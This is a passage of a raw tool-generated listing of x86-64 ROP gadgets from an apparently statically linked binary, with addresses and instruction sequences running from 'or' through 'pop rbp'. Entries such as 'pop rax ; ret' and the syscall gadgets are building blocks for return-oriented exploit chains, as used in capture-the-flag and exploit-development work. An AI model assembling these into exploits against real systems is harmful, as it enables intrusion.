0x00000000004883ab : or byte ptr [rcx + 1], cl ; ret 0x894c
0x00000000004835a0 : or byte ptr [rcx + rax - 0x3e], cl ; mov rax, rdx ; pop rbx ; ret
0x0000000000489c6b : or byte ptr [rcx + rcx*4 - 0x16], cl ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x0000000000411b41 : or byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x00000000004845b2 : or byte ptr [rcx - 0x2feeb728], cl ; pop rbp ; pop rbx ; ret
0x00000000004b42dc : or byte ptr [rcx - 0x33900000], 0xfc ; jmp qword ptr [rsi]
0x000000000044ba0b : or byte ptr [rcx - 0x75], cl ; add al, byte ptr [rbx + 0x94801e0] ; ret 0x8949
0x0000000000442e88 : or byte ptr [rcx - 0x76b7f7be], cl ; clc ; ret
0x00000000004211c8 : or byte ptr [rcx - 0x77], cl ; ret
0x000000000040d52a : or byte ptr [rcx - 0x77], cl ; ret 0x8b4c
0x000000000044b1da : or byte ptr [rcx - 0x77], cl ; retf
0x000000000044b1a6 : or byte ptr [rcx - 0xa], al ; ret
0x000000000041d6f6 : or byte ptr [rcx - 0xa], al ; ret 0xf04
0x00000000004150aa : or byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x00000000004a977e : or byte ptr [rdi + 0x26], al ; and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x000000000047bce0 : or byte ptr [rdi + 0x315], 4 ; ret
0x000000000047bc30 : or byte ptr [rdi + 0x315], 4 ; xor eax, eax ; ret
0x0000000000454ebb : or byte ptr [rdi], 0x85 ; retf 0xfffa
0x0000000000455247 : or byte ptr [rdi], 0x85 ; rol dword ptr [rdx], 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000450627 : or byte ptr [rdi], 0x8e ; ret 1
0x000000000040efe2 : or byte ptr [rdi], cl ; mov dh, 0x73 ; add dword ptr [rax - 0x7d], ecx ; ret
0x0000000000475950 : or byte ptr [rdi], cl ; mov dh, 0xc0 ; add rsp, 0x58 ; ret
0x00000000004884eb : or byte ptr [rdi], cl ; mov dh, 0xc0 ; neg eax ; ret
0x0000000000404014 : or byte ptr [rdi], cl ; retf 0x8941
0x000000000042e7db : or byte ptr [rdi], cl ; sub dword ptr [rdi], esp ; jmp r9
0x000000000041b7c6 : or byte ptr [rdi], cl ; test ebx, ebp ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x0000000000483203 : or byte ptr [rdi], cl ; xchg eax, edx ; ret 0x8949
0x00000000004012f1 : or byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd284
0x0000000000471a53 : or byte ptr [rdx + rbx - 0x7d], dh ; retf 0x4808
0x00000000004b03dc : or byte ptr [rdx], 0 ; jo 0x4b0394 ; stc ; jmp qword ptr [rcx]
0x00000000004abe64 : or byte ptr [rip - 0x6d380000], al ; cmc ; call qword ptr [rdx]
0x000000000046add4 : or byte ptr [rsi - 0x76befffd], cl ; retf
0x00000000004947c4 : or cl, 0xf9 ; call rax
0x00000000004900f2 : or cl, bh ; dec dword ptr [rax - 0x77] ; fucomip st(0) ; ret
0x0000000000492858 : or cl, bh ; idiv bh ; jmp 0xffffffffe1491f60
0x00000000004583d1 : or cl, byte ptr [rax + 0x39] ; ret 0x1176
0x0000000000411434 : or cl, byte ptr [rax + 1] ; ret 0x8948
0x0000000000410d27 : or cl, byte ptr [rax - 0x7d] ; ret
0x0000000000424332 : or cl, byte ptr [rax - 0x7d] ; ret 0x4801
0x000000000045d5de : or cl, byte ptr [rax - 0x7d] ; ret 0x8d04
0x0000000000486dbd : or cl, byte ptr [rcx - 0x75] ; add al, 0x24 ; add rax, qword ptr [rdx + 8] ; call rax
0x000000000047b705 : or cl, ch ; ret
0x00000000004142a6 : or cl, ch ; retf
0x000000000047f869 : or cl, ch ; retf 0xfffd
0x00000000004a9162 : or dh, al ; mov ebx, dword ptr [rdx] ; retf 0x7272
0x0000000000435db3 : or dh, bl ; movq qword ptr [rdi], mm1 ; ret
0x000000000048f635 : or dh, bl ; ret
0x00000000004a8f8a : or dh, byte ptr [rbp + 0x23] ; retf 0x32dd
0x000000000044d79c : or dh, dh ; ret 0x8902
0x000000000041b317 : or dh, dh ; ret 0xf02
0x0000000000494a41 : or dl, bh ; call qword ptr [rax + 0x10fffa10]
0x0000000000494c41 : or dl, bh ; jmp qword ptr [rax]
0x0000000000420f2a : or dword ptr [rax + 0xf000008], 0xffffff93 ; ret 0x3d83
0x000000000044ddda : or dword ptr [rax + 1], 0xffffffd8 ; jmp rax
0x000000000040dafb : or dword ptr [rax + rax*8 - 0x38b79f8c], eax ; ret 0xfff0
0x00000000004295f7 : or dword ptr [rax + rax], edx ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000044bf03 : or dword ptr [rax - 0x76b7fffe], edx ; ret
0x000000000045afce : or dword ptr [rax - 0x7d], ecx ; ret 0x4101
0x000000000044164e : or dword ptr [rax - 1], ecx ; ret 0xc148
0x000000000047293b : or dword ptr [rax], eax ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x0000000000488bf0 : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000042b0c7 : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043ffdf : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042b005 : or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000412577 : or dword ptr [rax], eax ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x000000000044ae4d : or dword ptr [rax], eax ; add byte ptr [rax], al ; syscall
0x000000000042a008 : or dword ptr [rax], eax ; add byte ptr [rbp - 0x77], cl ; retf
0x000000000045eaf5 : or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x0000000000402033 : or dword ptr [rax], eax ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x0000000000492fb7 : or dword ptr [rax], ecx ; retf
0x0000000000482dd1 : or dword ptr [rbp + 0x39], ecx ; retf
0x00000000004a88d3 : or dword ptr [rbp + 0x68], edi ; mov ch, 0x41 ; outsb dx, byte ptr [rsi] ; sbb edi, ebp ; retf
0x000000000042df76 : or dword ptr [rbp - 0xcffffff], 0xf ; outsd dx, dword ptr [rsi] ; push rdi ; ret 0xff3
0x00000000004560d3 : or dword ptr [rbx - 0x76be0006], edi ; ret 0x5be9
0x0000000000413730 : or dword ptr [rbx], 0x20 ; mov eax, 0xffffffff ; pop rbx ; ret
0x0000000000480f98 : or dword ptr [rdi], ecx ; xchg byte ptr [rcx + 0x38000000], dh ; retf 0x850f
0x000000000046f3f2 : or dword ptr [rdi], ecx ; xchg dword ptr [rdi], esi ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x8b08
0x000000000046cba0 : or dword ptr [rdi], ecx ; xchg ecx, esp ; add al, byte ptr [rax] ; add byte ptr [rcx - 0x7d], al ; retf 0xe9ff
0x00000000004a912e : or dword ptr [rdx + 2], edx ; rcr dword ptr [rcx], cl ; retf 0xbb9a
0x0000000000424d37 : or dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000047fe26 : or dword ptr [rip + 0x23a3bb], 1 ; pop rbx ; ret
0x00000000004b4118 : or eax, 0x10a0303 ; ret
0x00000000004b4170 : or eax, 0x1370303 ; ret
0x0000000000445371 : or eax, 0x1c478d48 ; ret
0x00000000004b4108 : or eax, 0x34b0303 ; ret
0x00000000004b413c : or eax, 0x35b0303 ; ret
0x000000000046f212 : or eax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x4404
0x000000000046ea7a : or eax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000045b0da : or eax, 0x441f0f ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000440c62 : or eax, 0x48c0bc0f ; lea eax, [rdi + rax] ; ret
0x000000000042ac17 : or eax, 0x83480000 ; ret 0x4910
0x000000000043e591 : or eax, 0x83480000 ; ret 0xe910
0x000000000042ac45 : or eax, 0x83480000 ; ret 0xeb10
0x000000000042ac0d : or eax, 0x83490000 ; jmp 0x42ac2d
0x0000000000428538 : or eax, 0x894d0000 ; retf
0x0000000000491092 : or eax, 0x8c48348 ; pop rbx ; pop rbp ; ret
0x00000000004745d2 : or eax, 0xc2bc0f48 ; shr rax, 2 ; ret
0x0000000000494c5d : or eax, 0xc90fffa ; cli ; call qword ptr [rax]
0x0000000000494c1d : or eax, 0xca0fffa ; cli ; jmp qword ptr [rax]
0x00000000004a6f81 : or eax, 0xcad7947e ; jmp 0x4a6f2d
0x0000000000494ad9 : or eax, 0xd52fffa ; cli ; call rdx
0x000000000049f1b9 : or eax, 0xdbf0000 ; add byte ptr [rax], al ; ret 0xd
0x000000000049f1c5 : or eax, 0xdc80000 ; add byte ptr [rax], al ; retf
0x00000000004a9113 : or eax, 0xe6d46ec6 ; mov bh, 0x4e ; retf 0x9d7d
0x0000000000454b05 : or eax, 0xea810000 ; ret 0
0x00000000004a8db3 : or eax, 0xeeb0f650 ; fcmovb st(0), st(3) ; ret
0x0000000000435c63 : or eax, 0xf7f0ff3 ; ret
0x00000000004498fd : or eax, 0xffffffff ; ret
0x000000000042c899 : or eax, 1 ; ret
0x000000000042adf7 : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043e731 : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042ae25 : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000044aef1 : or eax, dword ptr [rax] ; add byte ptr [rax], al ; syscall
0x00000000004286b8 : or eax, dword ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x00000000004ac471 : or eax, dword ptr [rax] ; add byte ptr [rdx + rbp - 0xa], bh ; call qword ptr [rdx]
0x00000000004ad390 : or eax, dword ptr [rdx] ; jae 0x4ad3a2 ; ret
0x00000000004b544a : or eax, dword ptr [rdx] ; ret 0xe0a
0x0000000000418c64 : or ebp, dword ptr [rbx] ; push rax ; sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x000000000041324d : or ebp, edx ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000046aef1 : or ebx, dword ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x0000000000435e23 : or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x00000000004150d6 : or ebx, esi ; ret
0x0000000000423baf : or ecx, dword ptr [rax + 0x63] ; ret
0x0000000000413fc7 : or ecx, dword ptr [rax + 1] ; ret 0x8949
0x0000000000410f48 : or ecx, dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x94 ; ret 0xdaf7
0x0000000000464cd6 : or ecx, dword ptr [rax - 0x7d] ; call 0xffffffffc27f94e6
0x0000000000424aec : or ecx, dword ptr [rax - 0x7d] ; ret
0x000000000049110f : or ecx, dword ptr [rax - 0x7d] ; ret 0x4810
0x0000000000482aa3 : or ecx, dword ptr [rbp + 0x39] ; ret 0x860f
0x0000000000494c69 : or edi, edx ; call qword ptr [rax]
0x0000000000494aed : or edi, edx ; call rdx
0x0000000000494c2d : or edi, edx ; jmp qword ptr [rax + 0x10fffa0a]
0x0000000000494c29 : or edi, edx ; jmp qword ptr [rax]
0x0000000000494a71 : or edi, edx ; push qword ptr [rax + 0xa] ; cli ; jmp rax
0x000000000044aea9 : or edx, 0x40 ; mov eax, ecx ; syscall
0x0000000000494af9 : or edx, edi ; jmp qword ptr [rdx]
0x0000000000494c79 : or edx, edi ; jmp rax
0x0000000000435d43 : or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x000000000045b854 : or esi, ebx ; ret
0x0000000000413731 : or esp, dword ptr [rax] ; mov eax, 0xffffffff ; pop rbx ; ret
0x00000000004acb9a : or esp, dword ptr [rsi + rcx + 0x18] ; ret
0x000000000044aea8 : or r10d, 0x40 ; mov eax, ecx ; syscall
0x0000000000435e92 : or r11b, r14b ; movq qword ptr [rdi], mm1 ; ret
0x0000000000435e22 : or r11d, r14d ; movq qword ptr [rdi], mm1 ; ret
0x0000000000435db2 : or r14b, r11b ; movq qword ptr [rdi], mm1 ; ret
0x0000000000435d42 : or r14d, r11d ; movq qword ptr [rdi], mm1 ; ret
0x00000000004b5449 : or r8d, dword ptr [r10] ; ret 0xe0a
0x000000000047f868 : or r9b, bpl ; retf 0xfffd
0x00000000004583d0 : or r9b, byte ptr [r8 + 0x39] ; ret 0x1176
0x00000000004b416f : or rax, 0x1370303 ; ret
0x00000000004b4107 : or rax, 0x34b0303 ; ret
0x00000000004b413b : or rax, 0x35b0303 ; ret
0x000000000046f211 : or rax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x4404
0x000000000046ea79 : or rax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004498fc : or rax, 0xffffffffffffffff ; ret
0x000000000042ae97 : or rax, qword ptr [r8] ; add byte ptr [rbp - 0x77], cl ; retf
0x00000000004ad38f : or rax, qword ptr [rdx] ; jae 0x4ad3a3 ; ret
0x00000000004acb99 : or rsp, qword ptr [rsi + r9 + 0x18] ; ret
0x0000000000425066 : out 0, al ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x0000000000424f26 : out 0, eax ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000048dd35 : out 0x41, eax ; call rdi
0x00000000004868f9 : out 0x48, al ; add esp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x0000000000470edd : out 0x48, al ; mov edi, ebx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x0000000000423718 : out 0x48, eax ; sub eax, 0x10 ; ret
0x0000000000473db6 : out 0x49, al ; std ; dec dword ptr [rax + 0xf] ; ret 0x90c3
0x00000000004a89a0 : out 0x78, al ; jnp 0x4a8a02 ; retf
0x0000000000489b9d : out 0x89, al ; out dx, eax ; call qword ptr [r14]
0x00000000004019cd : out 0x89, al ; out dx, eax ; call qword ptr [r15 + rbx*8]
0x0000000000489c71 : out 0x89, al ; out dx, eax ; call qword ptr [rax]
0x0000000000489d4d : out 0x89, al ; out dx, eax ; call qword ptr [rcx]
0x0000000000489b57 : out 0x89, al ; out dx, eax ; call rax
0x00000000004a6f31 : out 0xb3, al ; retf 0xe80
0x00000000004a7c60 : out 0xcf, eax ; movsb byte ptr [rdi], byte ptr [rsi] ; in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x000000000044e678 : out 0xe8, eax ; ret 0xfddc
0x00000000004057ca : out 0xeb, eax ; retf 0x8b49
0x000000000043562a : out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00000000004356aa : out 0xf3, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00000000004a9988 : out 0xf5, eax ; mov ch, 0xab ; ret
0x0000000000472865 : out 0xf7, al ; fucomi st(0) ; ret
0x0000000000494691 : out 0xf9, al ; call rax
0x0000000000494651 : out 0xf9, eax ; call qword ptr [rax]
0x0000000000494775 : out 0xf9, eax ; jmp qword ptr [rax]
0x0000000000461cf2 : out 0xff, eax ; dec dword ptr [rbp + 0x63] ; ret 0x20be
0x000000000047628e : out 2, eax ; add byte ptr [rax + 9], cl ; ret 0x850f
0x00000000004577ae : out dx, al ; add al, 0 ; add byte ptr [rax + 0x29], cl ; ret 0x349
0x00000000004a8db7 : out dx, al ; fcmovb st(0), st(3) ; ret
0x0000000000424d4e : out dx, al ; jns 0x424d58 ; add byte ptr [rsi + rax*8 - 0xd], dh ; ret
0x000000000044a24d : out dx, al ; mov edi, ebx ; mov eax, 1 ; syscall
0x000000000044a17d : out dx, al ; mov edi, ebx ; xor eax, eax ; syscall
0x000000000042fe2a : out dx, al ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000414245 : out dx, al ; mov rdi, r14 ; call 0x4004ae
0x0000000000423e22 : out dx, al ; mov rdi, rax ; call rcx
0x000000000044ae48 : out dx, al ; mov rdi, rbp ; mov eax, 9 ; syscall
0x0000000000435a3a : out dx, al ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043fe8e : out dx, al ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004a9112 : out dx, al ; or eax, 0xe6d46ec6 ; mov bh, 0x4e ; retf 0x9d7d
0x00000000004a899f : out dx, al ; out 0x78, al ; jnp 0x4a8a03 ; retf
0x00000000004227d3 : out dx, al ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000424168 : out dx, al ; pop rbx ; pop rbp ; mov rdi, rax ; jmp 0x400440
0x00000000004207e6 : out dx, al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000402bde : out dx, al ; ret
0x0000000000494c89 : out dx, al ; stc ; jmp qword ptr [rax + 0x20fff9ef]
0x0000000000494cc9 : out dx, al ; stc ; jmp qword ptr [rax]
0x00000000004741f9 : out dx, eax ; add r15, r12 ; call 0x400496
0x0000000000418229 : out dx, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x0000000000418281 : out dx, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000431074 : out dx, eax ; and byte ptr [rbp + rcx*4 + 0x1d], cl ; ret
0x0000000000468aa1 : out dx, eax ; call 0x4004b0
0x0000000000422344 : out dx, eax ; call 0x41e583
0x0000000000450335 : out dx, eax ; call 0x458fe8
0x0000000000489b9f : out dx, eax ; call qword ptr [r14]
0x00000000004019cf : out dx, eax ; call qword ptr [r15 + rbx*8]
0x0000000000489c73 : out dx, eax ; call qword ptr [rax]
0x0000000000489d4f : out dx, eax ; call qword ptr [rcx]
0x0000000000458a9d : out dx, eax ; call r12
0x000000000048ed1d : out dx, eax ; call r14
0x00000000004231a7 : out dx, eax ; call rax
0x0000000000474232 : out dx, eax ; call rbx
0x00000000004a9a05 : out dx, eax ; cmp cl, byte ptr [rsi] ; and byte ptr [rbx + 0x3d], bh ; retf
0x000000000044ae4b : out dx, eax ; mov eax, 9 ; syscall
0x0000000000412ded : out dx, eax ; mov eax, r9d ; syscall
0x000000000042fc5a : out dx, eax ; mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x000000000042fd56 : out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x000000000042fca2 : out dx, eax ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000474383 : out dx, eax ; mov r9, r14 ; call rbx
0x000000000040e0aa : out dx, eax ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000041427c : out dx, eax ; mov rdx, rbp ; add rbp, r13 ; call 0x4004b1
0x0000000000435aba : out dx, eax ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043ff8d : out dx, eax ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000042cfc3 : out dx, eax ; pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42cf9b
0x000000000042d041 : out dx, eax ; pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42d019
0x000000000042d4d3 : out dx, eax ; pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42d4ab
0x000000000042d551 : out dx, eax ; pop rsi ; adc byte ptr [rsi + 0xf], ah ; jmp 0x42d529
0x000000000042cbc3 : out dx, eax ; push rsi ; adc byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000042cbd8 : out dx, eax ; push rsi ; and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000042cbed : out dx, eax ; push rsi ; xor byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004470a3 : out dx, eax ; ret 0xf66
0x0000000000447086 : out dx, eax ; retf 0x4466
0x00000000004a90db : out dx, eax ; retf 0xab0d
0x000000000042514a : out dx, eax ; shl byte ptr [rsi + 0xf], 0x74 ; shl dword ptr [rsi + 0xf], 0x74 ; retf 0xf66
0x000000000042e0dc : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x2373
0x000000000042e0c5 : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x000000000042e0ae : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x000000000042cb6a : out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000494c8d : out dx, eax ; stc ; jmp qword ptr [rax]
0x000000000048ac97 : out dx, eax ; xor byte ptr [rax - 0x77], cl ; ret 0x2148
0x000000000043de9e : outsb dx, byte ptr [rsi] ; adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004454ce : outsb dx, byte ptr [rsi] ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7504
0x00000000004a9563 : outsb dx, byte ptr [rsi] ; ja 0x4a94ec ; ret 0x48f
0x000000000047d8b0 : outsb dx, byte ptr [rsi] ; or byte ptr [rax + 1], cl ; ret
0x00000000004a7f92 : outsb dx, byte ptr [rsi] ; retf
0x00000000004a72a4 : outsb dx, byte ptr [rsi] ; sahf ; ret 0x38ae
0x00000000004a88d8 : outsb dx, byte ptr [rsi] ; sbb edi, ebp ; retf
0x0000000000494319 : outsb dx, byte ptr [rsi] ; stc ; jmp qword ptr [rax]
0x000000000049626d : outsb dx, byte ptr [rsi] ; sti ; jmp qword ptr [rax]
0x000000000047a814 : outsd dx, dword ptr [rsi] ; add byte ptr [rax], al ; add al, ch ; ret
0x0000000000419aa2 : outsd dx, dword ptr [rsi] ; and al, 0x89 ; adc byte ptr [r11 + 0x5d], r11b ; ret
0x00000000004252f8 : outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x000000000043981e : outsd dx, dword ptr [rsi] ; fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x00000000004303e2 : outsd dx, dword ptr [rsi] ; mov ebx, 0x4e6f0ff3 ; retf
0x00000000004305e2 : outsd dx, dword ptr [rsi] ; mov edx, 0x4e6f0ff3 ; retf 0x8b4c
0x000000000042dedd : outsd dx, dword ptr [rsi] ; push rdi ; ret
0x000000000042df7d : outsd dx, dword ptr [rsi] ; push rdi ; ret 0xff3
0x000000000042daa2 : outsd dx, dword ptr [rsi] ; push rdi ; retf
0x000000000042db22 : outsd dx, dword ptr [rsi] ; push rdi ; retf 0xcab2
0x000000000047345a : outsd dx, dword ptr [rsi] ; push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x000000000042dee2 : outsd dx, dword ptr [rsi] ; ret
0x000000000046351d : outsd dx, dword ptr [rsi] ; ret 0x290f
0x0000000000463546 : outsd dx, dword ptr [rsi] ; ret 0x3e8
0x000000000041ac6a : outsd dx, dword ptr [rsi] ; ret 0x4466
0x00000000004a7c66 : outsd dx, dword ptr [rsi] ; ret 0x5ae4
0x000000000041a6a2 : outsd dx, dword ptr [rsi] ; ret 0x8348
0x0000000000430597 : outsd dx, dword ptr [rsi] ; ret 0x8b4c
0x000000000046629d : outsd dx, dword ptr [rsi] ; ret 0xace8
0x000000000042df82 : outsd dx, dword ptr [rsi] ; ret 0xc2b2
0x0000000000466279 : outsd dx, dword ptr [rsi] ; ret 0xe583
0x00000000004734aa : outsd dx, dword ptr [rsi] ; ret 0xf66
0x0000000000430462 : outsd dx, dword ptr [rsi] ; retf
0x000000000043d849 : outsd dx, dword ptr [rsi] ; retf 0x4466
0x0000000000430662 : outsd dx, dword ptr [rsi] ; retf 0x8b4c
0x000000000042d4ca : outsd dx, dword ptr [rsi] ; retf 0xf66
0x000000000042cfba : outsd dx, dword ptr [rsi] ; retf 0xff3
0x00000000004634e4 : outsd dx, dword ptr [rsi] ; sbb ah, byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; ret
0x000000000046623f : outsd dx, dword ptr [rsi] ; sbb dword ptr [rsi + 0xf], esp ; outsd dx, dword ptr [rsi] ; retf
0x000000000049431d : outsd dx, dword ptr [rsi] ; stc ; call qword ptr [rax]
0x0000000000496279 : outsd dx, dword ptr [rsi] ; sti ; call rax
0x0000000000495a8c : outsd dx, dword ptr [rsi] ; sti ; inc dword ptr [rdx + 0x44] ; sti ; call rdi
0x0000000000424eeb : outsd dx, dword ptr [rsi] ; sub dword ptr [rax], eax ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x00000000004a7c65 : outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x00000000004ab881 : paddd mm7, mm7 ; retf 0xfe0f
0x000000000042aad2 : pcmpeqb mm0, mm1 ; lea r10, [r10 + r9] ; jmp r10
0x0000000000474964 : pcmpeqb mm3, qword ptr [rcx] ; add rax, 2 ; ret
0x000000000047494f : pcmpeqb mm3, qword ptr [rsi] ; ret
0x000000000042aad1 : pcmpeqb xmm0, xmm1 ; lea r10, [r10 + r9] ; jmp r10
0x00000000004a9065 : pcmpeqw mm5, qword ptr [rbp + r12*2 - 0x5f] ; mov cs, edi ; ret 0x8b36
0x00000000004a9066 : pcmpeqw mm5, qword ptr [rbp - 0x5f] ; mov cs, edi ; ret 0x8b36
0x0000000000448766 : pextrw edi, mm0, 0x77 ; ret
0x000000000042bc92 : pmovmskb eax, mm1 ; test eax, eax ; jne 0x42bcf9 ; xor eax, eax ; ret
0x000000000044127f : pmovmskb edx, mm4 ; test edx, edx ; je 0x441293 ; bsf eax, edx ; ret
0x000000000044c6b5 : pop r10 ; ret
0x00000000004a94ef : pop r10 ; sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x000000000044ea70 : pop r12 ; jmp 0x45b4e4
0x000000000044afe1 : pop r12 ; jmp rax
0x000000000044afc6 : pop r12 ; mov esi, 2 ; jmp rax
0x00000000004207e9 : pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000422d0c : pop r12 ; pop r13 ; pop r14 ; jmp rcx
0x00000000004219b6 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x000000000040269e : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000040067f : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004101f9 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000410a8e : pop r12 ; pop r13 ; pop r14 ; ret
0x000000000040db89 : pop r12 ; pop r13 ; ret
0x0000000000405e94 : pop r12 ; ret
0x00000000004207eb : pop r13 ; pop r14 ; jmp rax
0x0000000000422d0e : pop r13 ; pop r14 ; jmp rcx
0x00000000004219b8 : pop r13 ; pop r14 ; pop r15 ; jmp rax
0x00000000004026a0 : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000400681 : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004101fb : pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000410a90 : pop r13 ; pop r14 ; ret
0x000000000040db8b : pop r13 ; ret
0x00000000004207ed : pop r14 ; jmp rax
0x0000000000422d10 : pop r14 ; jmp rcx
0x00000000004219ba : pop r14 ; pop r15 ; jmp rax
0x00000000004026a2 : pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000400683 : pop r14 ; pop r15 ; ret
0x00000000004101fd : pop r14 ; pop rbp ; ret
0x0000000000410a92 : pop r14 ; ret
0x00000000004219bc : pop r15 ; jmp rax
0x00000000004026a4 : pop r15 ; pop rbp ; ret
0x0000000000400685 : pop r15 ; ret
0x00000000004b11a1 : pop rax ; add byte ptr [rax], al ; pop rsp ; sbb al, 0xfa ; call rcx
0x00000000004b1235 : pop rax ; add byte ptr [rax], al ; test al, 0x25 ; cli ; call qword ptr [rdi]
0x000000000041efa4 : pop rax ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4c07
0x000000000046122b : pop rax ; and eax, 0x48b4800 ; clc ; jmp rax
0x000000000045eeb9 : pop rax ; idiv edi ; dec dword ptr [rax + 0x63] ; retf
0x000000000045dded : pop rax ; idiv edi ; dec dword ptr [rax - 0x39] ; ret 0xac20
0x000000000045f4f2 : pop rax ; jmp 0x45f4f9
0x0000000000481c6c : pop rax ; jmp qword ptr [rax]
0x00000000004922a2 : pop rax ; or byte ptr [rbp - 0x77], cl ; ret
0x0000000000481d26 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000415f04 : pop rax ; ret
0x00000000004a9443 : pop rax ; retf
0x00000000004942d5 : pop rax ; stc ; jmp qword ptr [rax]
0x00000000004b03c8 : pop rax ; stosd dword ptr [rdi], eax ; stc ; jmp qword ptr [rcx]
0x000000000048f141 : pop rax ; sub byte ptr [rbp + 1], cl ; retf
0x0000000000456de9 : pop rbp ; add al, 0x4d ; cmp ebp, ebx ; jb 0x456e61 ; mov rdx, rax ; jmp 0x456db8
0x00000000004b16b9 : pop rbp ; add byte ptr [rax], al ; and al, 0x79 ; cli ; call qword ptr [rdx]
0x00000000004b1739 : pop rbp ; add byte ptr [rax], al ; push rsp ; jns 0x4b173f ; jmp rax
